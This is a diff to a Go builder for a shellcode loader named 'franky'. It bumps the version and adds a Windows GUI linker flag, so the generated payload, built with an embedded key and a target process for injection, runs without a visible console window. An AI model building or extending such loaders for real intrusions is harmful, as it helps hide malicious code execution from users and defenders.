@@ -27,7 +27,7 @@ func main() {
 		fmt.Fprintf(w, "\t%s \n", headerString)
 		fmt.Fprintf(w, "\t\tShellcode Loader\n\n")
 		fmt.Fprintf(w, "\tAuthor: misthi0s (@_misthi0s)\n")
-		fmt.Fprintf(w, "\tVersion: 0.1\n")
+		fmt.Fprintf(w, "\tVersion: 0.1.1\n")
 		fmt.Fprintf(w, "\tUsage: ./franky [options] \n\n")
 		flag.PrintDefaults()
 		fmt.Fprintf(w, "%s\n", footerString)
@@ -86,7 +86,7 @@ func main() {
 
 	// Generate build parameters for main payload
 	exeName := randomExe()
-	ldflagVar := fmt.Sprintf("-X main.franky=%s -X main.injectProc=%s -w -s", key, *injectProc)
+	ldflagVar := fmt.Sprintf("-X main.franky=%s -X main.injectProc=%s -w -s -H=windowsgui", key, *injectProc)
 	buildVar := fmt.Sprintf("-tags='%s'", goArch)
 	outputVar := filepath.FromSlash(fmt.Sprintf("../output/%s", exeName))
 	os.Setenv("GOARCH", goArch)
